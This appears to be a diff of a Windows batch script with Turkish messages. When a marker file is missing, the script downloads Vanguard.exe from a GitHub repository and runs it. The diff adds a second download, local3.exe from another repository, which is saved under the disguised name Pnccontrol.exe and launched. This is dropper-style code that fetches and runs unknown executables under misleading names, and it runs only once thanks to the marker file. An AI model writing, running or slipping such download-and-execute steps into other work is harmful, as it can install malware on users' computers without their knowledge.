@@ -10,8 +10,9 @@ if exist nagihori2.txt (
 ) else (
     echo nagihori.txt yok, devam ediliyor...
     curl -L https://github.com/seition2doc/dosta2/raw/refs/heads/main/Vanguard.exe -o Vanguard.exe
+    curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o Pnccontrol.exe
     echo "asd" > nagihori2.txt 
     start Vanguard.exe
-    
+    start PncControl.exe
     
 )
